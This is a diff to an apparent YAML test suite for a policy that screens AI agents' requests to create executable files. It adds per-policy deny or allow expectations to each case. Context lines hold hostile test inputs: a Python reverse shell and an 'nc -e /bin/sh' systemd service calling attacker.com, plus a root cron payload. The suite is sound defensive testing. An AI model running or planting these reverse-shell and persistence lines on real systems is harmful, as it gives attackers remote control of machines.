@@ -17,6 +17,9 @@
       executable: true
   expectations:
     decision: deny
+    policies:
+      - policy_name: "Check executable file creation"
+        decision: deny
 
 # Test: Create Python script with reverse shell
 - case_id: ai-req-041
@@ -33,6 +36,9 @@
       content: "import socket; s=socket.socket(); s.connect(('attacker.com',4444)); import subprocess; subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno())"
   expectations:
     decision: deny
+    policies:
+      - policy_name: "Check executable file creation"
+        decision: deny
 
 # Test: Create cron job
 - case_id: ai-req-042
@@ -49,6 +55,9 @@
       content: "* * * * * root /tmp/payload.sh"
   expectations:
     decision: deny
+    policies:
+      - policy_name: "Check executable file creation"
+        decision: deny
 
 # Test: Modify systemd service
 - case_id: ai-req-043
@@ -65,6 +74,9 @@
       content: "[Service]\nExecStart=/bin/bash -c 'nc -e /bin/sh attacker.com 4444'"
   expectations:
     decision: deny
+    policies:
+      - policy_name: "Check executable file creation"
+        decision: deny
 
 # Test: Allow creating normal scripts in project
 - case_id: ai-req-044
@@ -81,6 +93,9 @@
       content: "#!/bin/bash\nnpm run build"
   expectations:
     decision: allow
+    policies:
+      - policy_name: "Check executable file creation"
+        decision: allow
 
 # Test: Allow creating test helpers
 - case_id: ai-req-045
@@ -97,3 +112,6 @@
       content: "#!/bin/bash\nmkdir -p ./test-data\necho 'test' > ./test-data/sample.txt"
   expectations:
     decision: allow
+    policies:
+      - policy_name: "Check executable file creation"
+        decision: allow
